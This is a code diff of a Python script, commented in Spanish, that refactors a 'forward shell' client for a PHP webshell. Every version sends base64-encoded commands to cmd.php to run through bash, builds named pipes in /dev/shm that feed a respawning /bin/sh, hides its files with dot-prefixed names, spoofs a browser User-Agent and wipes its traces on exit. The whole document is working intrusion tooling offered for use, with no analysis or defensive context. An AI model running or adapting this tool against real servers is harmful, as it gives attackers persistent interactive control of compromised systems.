@@ -1,103 +1,101 @@
 #!/usr/bin/python3
 
-import requests, time, threading, signal, sys
-from base64 import b64encode
+import requests
+import time
+import threading
+import signal
+import sys
+import base64
 from random import randrange
 
-def handle_exit(sig, frame):
-    print("\n\n[!] Exiting...\n")
-    send_cmd(remove_input_cmd)
-    send_cmd(remove_output_cmd)
-    sys.exit(1)
-
-# Ctrl + C
-signal.signal(signal.SIGINT, handle_exit)
-
-# --- Configuración (modifica main_shell_url si hace falta) ---
-main_shell_url = "http://localhost/cmd.php"     # <-- cambia si tu webshell está en otra URL
-sess_id = randrange(1000, 9999)
-remote_in = "/dev/shm/f4ke_%s.in" % sess_id
-remote_out = "/dev/shm/f4ke_%s.out" % sess_id
-remove_input_cmd = "/bin/rm -f %s" % remote_in
-remove_output_cmd = "/bin/rm -f %s" % remote_out
-
-# -----------------------------------------------------------
-# Lector en background
-# -----------------------------------------------------------
-class OutputReader(object):
-    def __init__(self, interval=1):
-        self.interval = interval
-        thread = threading.Thread(target=self.run, args=())
-        thread.daemon = True
-        thread.start()
-
-    def run(self):
-        clear_cmd = "echo '' > %s" % remote_out
-        read_cmd = "/bin/cat %s" % remote_out
-
-        while True:
-            out = send_cmd(read_cmd)
-
-            if out:
-                send_cmd(clear_cmd)
-                print(out)
-
-            time.sleep(self.interval)
-
-# -----------------------------------------------------------
-# Funciones de comunicación
-# -----------------------------------------------------------
-def send_cmd(cmd):
-    """Envía cmd (string) codificado en base64 al main_shell_url y retorna la respuesta."""
-    payload = cmd.encode()
-    enc = b64encode(payload).decode()
-
-    post_data = {
-        'cmd': 'echo %s | base64 -d | bash' % enc
+# --- Configuración Avanzada ---
+class Config:
+    URL = "http://localhost/cmd.php"
+    SESS_ID = randrange(1000, 9999)
+    # Usamos un prefijo para identificar nuestros archivos fácilmente
+    REMOTE_IN = f"/dev/shm/.input_{SESS_ID}"
+    REMOTE_OUT = f"/dev/shm/.output_{SESS_ID}"
+    INTERVAL = 0.6  # Reducido para mayor fluidez
+    HEADERS = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
     }
 
-    r = (requests.post(main_shell_url, data=post_data, timeout=5).text).strip()
-    return r
+# --- Lógica de Comunicación ---
+def b64_cmd(cmd):
+    return base64.b64encode(cmd.encode()).decode()
 
-def prepare_remote_shell():
-    """Crea named pipes remotas y lanza tail -f | sh > stdout en background."""
-    mk = "mkfifo %s 2>/dev/null || true; mkfifo %s 2>/dev/null || true; (tail -f %s | /bin/sh 2>&1 > %s) &" % (remote_in, remote_in, remote_in, remote_out)
+def send_raw_command(full_command):
+    """Envía el comando final al servidor y maneja errores de red."""
     try:
-        send_cmd(mk)
-    except:
+        data = {'cmd': f'echo {b64_cmd(full_command)} | base64 -d | bash'}
+        r = requests.post(Config.URL, data=data, headers=Config.HEADERS, timeout=10)
+        return r.text.strip()
+    except requests.exceptions.RequestException as e:
+        return f"[!] Connection Error: {e}"
+
+# --- Gestión de la Shell ---
+class ShellManager:
+    def __init__(self):
+        self.stop_threads = False
+
+    def setup(self):
+        print(f"[*] Iniciando sesión {Config.SESS_ID}...")
+        # Creamos las pipes y lanzamos el proceso persistente
+        # Usamos un loop while para que si la shell muere, se reinicie automáticamente
+        setup_cmd = (
+            f"mkfifo {Config.REMOTE_IN} {Config.REMOTE_OUT}; "
+            f"while true; do /bin/sh < {Config.REMOTE_IN} > {Config.REMOTE_OUT} 2>&1; done &"
+        )
+        send_raw_command(setup_cmd)
+
+    def cleanup(self):
+        print("\n[*] Limpiando rastro y saliendo...")
+        self.stop_threads = True
+        cleanup_cmd = f"rm -f {Config.REMOTE_IN} {Config.REMOTE_OUT} && fg %1; kill $!"
+        send_raw_command(cleanup_cmd)
+        sys.exit(0)
+
+    def reader_loop(self):
+        """Lee el output de forma inteligente."""
+        # Comando para leer y vaciar el buffer sin borrar el archivo (más estable)
+        read_and_empty = f"cat {Config.REMOTE_OUT} && true > {Config.REMOTE_OUT}"
+        
+        while not self.stop_threads:
+            output = send_raw_command(read_and_empty)
+            if output:
+                print(output, end="", flush=True)
+            time.sleep(Config.INTERVAL)
+
+    def write(self, command):
+        """Escribe en la pipe de entrada."""
+        write_cmd = f"echo {b64_cmd(command + ' \n')} | base64 -d > {Config.REMOTE_IN}"
+        send_raw_command(write_cmd)
+
+# --- Ejecución ---
+shell = ShellManager()
+
+def signal_handler(sig, frame):
+    shell.cleanup()
+
+signal.signal(signal.SIGINT, signal_handler)
+
+if __name__ == "__main__":
+    shell.setup()
+    
+    # Hilo de lectura
+    t = threading.Thread(target=shell.reader_loop)
+    t.daemon = True
+    t.start()
+
+    print("[+] Shell establecida. Escribe 'exit' para terminar.")
+    
+    try:
+        while True:
+            cmd = input()
+            if cmd.lower() in ["exit", "quit"]:
+                break
+            shell.write(cmd)
+    except EOFError:
         pass
-    return None
-
-def write_remote(cmd):
-    """Escribe comando en stdin remoto (redirigiendo a la FIFO)."""
-    if not cmd.endswith("\n"):
-        cmd = cmd + "\n"
-    payload = cmd.encode()
-    enc = b64encode(payload).decode()
-
-    post_data = {
-        'cmd': 'echo %s | base64 -d > %s' % (enc, remote_in)
-    }
-
-    r = (requests.post(main_shell_url, data=post_data, timeout=5).text).strip()
-    return r
-
-def read_remote():
-    """Lee todo el stdout remoto (no usada en el loop principal, pero útil)."""
-    read_cmd = "/bin/cat %s" % remote_out
-    return send_cmd(read_cmd)
-
-# -----------------------------------------------------------
-# Main
-# -----------------------------------------------------------
-if __name__ == '__main__':
-    prepare_remote_shell()
-    reader = OutputReader()
-
-    try:
-        while True:
-            cmd_line = input("webshell:~$ ")
-            write_remote(cmd_line + "\n")
-            time.sleep(1.1)
-    except KeyboardInterrupt:
-        handle_exit(None, None)
+    
+    shell.cleanup()
